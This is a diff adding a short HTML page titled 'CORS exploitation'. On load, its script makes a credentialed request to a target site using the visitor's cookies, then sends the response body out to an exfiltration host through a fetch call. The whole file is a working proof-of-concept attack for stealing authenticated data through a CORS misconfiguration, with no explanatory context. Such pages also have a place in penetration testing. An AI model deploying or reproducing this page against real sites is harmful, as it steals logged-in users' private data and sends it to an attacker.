@@ -1,0 +1,22 @@
+<html>
+    <head>CORS exploitation</head>
+    <body>
+        <h1>CORS - CORS - CORS - CORS - CORS</h1>
+        <script>
+            function submit(){
+                var req = new XMLHttpRequest();
+                req.withCredentials = true;
+                req.open('POST','http://target', true);
+                req.send(null);
+                
+            
+                req.onload = function(){
+                    console.log(req.status + ' - '+ req.response);
+                fetch('https://exfiltrate.redacted/?data=' + req.response );
+                } }
+            window.load = submit();
+        </script>
+        
+    </body>
+    
+</html>
